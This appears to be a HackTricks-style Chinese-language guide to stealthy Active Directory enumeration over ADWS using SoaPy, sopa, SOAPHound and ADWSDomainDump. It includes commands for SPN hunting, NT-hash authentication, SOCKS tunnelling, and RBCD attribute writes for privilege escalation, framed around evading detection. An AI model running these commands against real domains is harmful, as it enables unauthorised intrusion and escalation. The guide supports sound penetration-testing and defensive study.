# Active Directory Web Services (ADWS) 枚举与隐蔽收集

{{#include ../../banners/hacktricks-training.md}}

## ADWS 是什么？

Active Directory Web Services (ADWS) 自 **Windows Server 2008 R2** 起默认在每个 Domain Controller 上**启用**，并监听 TCP **9389**。尽管名称中包含 Web Services，**但并不涉及 HTTP**。相反，该服务通过一组专有的 .NET framing protocols 暴露类似 LDAP 的数据：<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量封装在这些二进制 SOAP frames 中，并通过不常见的端口传输，**相比经典 LDAP/389 与 636 流量，通过 ADWS 进行的枚举更不容易被检查、过滤或进行 signature 匹配**。对于 operator 而言，这意味着：<sup>[[1]](#references)[[7]](#references)</sup>

* 更隐蔽的 recon – Blue team 通常会重点关注 LDAP queries。
* 可以通过 SOCKS proxy 隧道传输 9389/TCP，从而从 **非 Windows 主机（Linux、macOS）** 收集数据。
* 能够获取通过 LDAP 可获得的相同数据（users、groups、ACLs、schema 等），并且可以执行 **writes**（例如用于 **RBCD** 的 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互基于 WS-Enumeration 实现：每个 query 都从一个 `Enumerate` message 开始，该 message 定义 LDAP filter/attributes 并返回一个 `EnumerationContext` GUID，随后由一个或多个 `Pull` messages 按 server-defined result window 流式返回结果。<sup>[[7]](#references)</sup> Contexts 会在约 30 分钟后过期，因此 tooling 需要对结果进行分页，或拆分 filters（按 CN 执行 prefix queries），以避免丢失 state。<sup>[[8]](#references)</sup> 请求 security descriptors 时，请指定 `LDAP_SERVER_SD_FLAGS_OID` control 以省略 SACLs，否则 ADWS 会直接从其 SOAP response 中删除 `nTSecurityDescriptor` attribute。

> 注意：许多 RSAT GUI/PowerShell tools 也使用 ADWS，因此流量可能会与合法的 admin activity 混在一起。

## SoaPy – 原生 Python 客户端

[SoaPy](https://github.com/logangoins/soapy) 是一个**完全使用纯 Python 重新实现 ADWS protocol stack 的项目**。它逐字节构造 NBFX/NBFSE/NNS/NMF frames，使得无需接触 .NET runtime 即可从 Unix-like systems 进行收集。<sup>[[1]](#references)[[2]](#references)</sup>

### 主要功能

* 支持**通过 SOCKS 进行 proxying**（适用于 C2 implants）。
* 支持与 LDAP `-q '(objectClass=user)'` 完全相同的细粒度 search filters。
* 可选的 **write** operations（`--set` / `--delete`）。
* **BOFHound output mode**，可直接导入 BloodHound。<sup>[[3]](#references)</sup>
* 在需要人类可读性时，使用 `--parse` flag 美化 timestamps / `userAccountControl`。<sup>[[2]](#references)</sup>

### Targeted collection flags 与 write operations

SoaPy 提供了一组 curated switches，通过 ADWS 复现最常见的 LDAP hunting tasks：`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`，以及用于 custom pulls 的 raw `--query` / `--filter` knobs。还可以结合 `--rbcd <source>` 等 write primitives（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（为 targeted Kerberoasting 进行 SPN staging）和 `--asrep`（在 `userAccountControl` 中启用 `DONT_REQ_PREAUTH`）。<sup>[[2]](#references)</sup>

仅返回 `samAccountName` 和 `servicePrincipalName` 的 targeted SPN hunt 示例：
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
使用相同的主机/凭据立即将发现结果 weaponise：使用 `--rbcds` dump 具备 RBCD 能力的对象，然后应用 `--rbcd 'WEBSRV01$' --account 'FILE01$'`，以构建 Resource-Based Constrained Delegation 链（完整的滥用途径请参阅 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

### 安装（operator 主机）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – 通过 ADWS 使用 LDAPDomainDump（Linux/Windows）

* `ldapdomaindump` 的 Fork，将 LDAP queries 替换为 TCP/9389 上的 ADWS calls，以减少 LDAP-signature 命中。
* 除非传入 `--force`，否则会先检查 9389 的可达性（如果 port scans 噪声较大或被过滤，则跳过 probe）。
* 已针对 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 进行测试，并在 README 中实现成功 bypass。<sup>[[4]](#references)</sup>

### 安装
```bash
pipx install .
```
### 用法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型输出会记录 9389 可达性检查、ADWS bind 以及 dump 开始/完成：
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 一个实用的 Golang ADWS client

与 soapy 类似，[sopa](https://github.com/Macmod/sopa) 使用 Golang 实现了 ADWS protocol stack（MS-NNS + MC-NMF + SOAP），并提供命令行 flags 来发起以下 ADWS calls：<sup>[[5]](#references)</sup>

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` 和 `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* 以及其他功能，例如 `groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]` 等。

### Protocol mapping highlights

* LDAP-style searches 通过 **WS-Enumeration**（`Enumerate` + `Pull`）发起，支持 attribute projection、scope control（Base/OneLevel/Subtree）和 pagination。
* Single-object fetch 使用 **WS-Transfer** `Get`；attribute changes 使用 `Put`；deletions 使用 `Delete`。
* 内置 object creation 使用 **WS-Transfer ResourceFactory**；custom objects 使用由 YAML templates 驱动的 **IMDA AddRequest**。
* Password operations 使用 **MS-ADCAP** actions（`SetPassword`、`ChangePassword`）。<sup>[[5]](#references)</sup>

### Unauthenticated metadata discovery (mex)

ADWS 无需 credentials 即可公开 WS-MetadataExchange，这是一种在 authenticating 之前快速验证 exposure 的方法：<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery & Kerberos targeting notes

如果省略 `--dc` 并提供 `--domain`，Sopa 可以通过 SRV 解析 DC。它会按以下顺序进行查询，并使用优先级最高的目标：<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
在实际操作中，优先使用由 DC 控制的 resolver，以避免在分段环境中发生故障：

* 使用 `--dns <DC-IP>`，使**所有** SRV/PTR/forward lookup 都通过 DC DNS。
* 当 UDP 被阻断或 SRV 响应较大时，使用 `--dns-tcp`。
* 如果启用了 Kerberos 且 `--dc` 是 IP，sopa 会执行**反向 PTR** 查询，以获取 FQDN，从而正确定位 SPN/KDC。如果不使用 Kerberos，则不会执行 PTR 查询。

示例（IP + Kerberos，通过 DC 强制使用 DNS）：
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Auth material options

除了明文密码外，sopa 还支持 **NT hashes**、**Kerberos AES keys**、**ccache** 和用于 ADWS 认证的 **PKINIT certificates**（PFX 或 PEM）。使用 `--aes-key`、`-c`（ccache）或基于证书的选项时，会隐式使用 Kerberos。<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### 通过模板创建自定义对象

对于任意对象类，`create custom` 命令会使用一个映射到 IMDA `AddRequest` 的 YAML 模板：<sup>[[5]](#references)</sup>

* `parentDN` 和 `rdn` 定义容器和相对 DN。
* `attributes[].name` 支持 `cn` 或命名空间形式的 `addata:cn`。
* `attributes[].type` 接受 `string|int|bool|base64|hex` 或显式的 `xsd:*`。
* **不要**包含 `ad:relativeDistinguishedName` 或 `ad:container-hierarchy-parent`；sopa 会注入它们。
* `hex` 值会转换为 `xsd:base64Binary`；使用 `value: ""` 可设置空字符串。

## SOAPHound – 高容量 ADWS Collection（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET collector，将所有 LDAP 交互保留在 ADWS 中，并输出兼容 BloodHound v4 的 JSON。它会一次性构建包含 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），随后在高容量的 `--bhdump`、`--certdump`（ADCS）或 `--dnsdump`（AD-integrated DNS）传递中重复使用该缓存，因此离开 DC 的关键 attributes 始终只有约 35 个。AutoSplit（`--autosplit --threshold <N>`）会按 CN 前缀自动拆分查询，以便在大型 forest 中保持在 30 分钟的 EnumerationContext timeout 内。<sup>[[8]](#references)</sup>

在已加入 domain 的 operator VM 上的典型工作流：
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
将导出的 JSON 直接导入 SharpHound/BloodHound workflows——请参阅 [BloodHound methodology](bloodhound.md) 了解下游图谱构建思路。AutoSplit 让 SOAPHound 能够在包含数百万对象的 forest 中保持稳定，同时将 query 数量控制在低于 ADExplorer-style snapshots 的水平。

## Stealth AD Collection Workflow

以下 workflow 展示了如何通过 ADWS 枚举 **domain & ADCS objects**，将其转换为 BloodHound JSON，并从 Linux 中搜寻基于 certificate 的 attack paths：

1. **通过隧道转发目标网络中的 9389/TCP** 到你的主机（例如使用 Chisel、Meterpreter、SSH dynamic port-forward 等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080`，或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集 root domain object：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从 Configuration NC 收集与 ADCS 相关的对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound：**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **在 BloodHound GUI 中上传 ZIP**，并运行诸如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 之类的 cypher 查询，以发现证书提权路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity`（RBCD）
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将其与 `s4u2proxy`/`Rubeus /getticket` 结合，即可形成完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具概览

| 用途 | 工具 | 备注 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、读写 |
| 高容量 ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、cache-first、BH/ADCS/DNS 模式 |
| BloodHound 导入 | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| 证书 compromise | [Certipy](https://github.com/ly4k/Certipy) | 可通过同一 SOCKS 进行代理 |
| ADWS enumeration 与对象更改 | [sopa](https://github.com/Macmod/sopa) | 用于与已知 ADWS endpoints 交互的通用 client - 支持 enumeration、对象创建、属性修改和密码更改 |

## References

- [1] [SpecterOps – 确保使用 SOAP(y) – 使用 ADWS 进行隐蔽 AD 收集的 Operator 指南](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMF 规范](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – 通过 ADWS 对 Active Directory 环境进行隐蔽 Enumeration](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – 通过 ADWS 收集 Active Directory 数据的 SOAPHound 工具](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
